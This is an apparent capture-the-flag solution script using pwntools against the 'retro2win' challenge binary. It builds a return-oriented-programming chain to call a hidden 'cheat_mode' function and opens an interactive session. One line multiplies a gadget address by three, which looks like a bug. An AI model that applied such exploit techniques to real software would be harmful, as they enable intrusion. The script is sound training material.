#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './retro2win'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'retro2win.ctf.intigriti.io', 1338 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())


# =========================================================
#                         NOTES
# =========================================================
'''
 ---------------------------------
| Symphonie der Entschlossenheit  |
 ---------------------------------
'''

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(elf)
    
    # payload = p64(rop.ret.address) * 3
    # payload += p64(elf.sym['cheatmod'])
    rop.raw(rop.ret.address * 3)
    rop.call(rop.rdi.address)
    rop.raw(0x2323232323232323)
    rop.call(elf.sym['cheat_mode'], [0x2323232323232323, 0x4242424242424242])
    
    io.sendline(b'1337')
    io.sendline(rop.chain())

    io.interactive()
    
if __name__ == '__main__':
    exploit()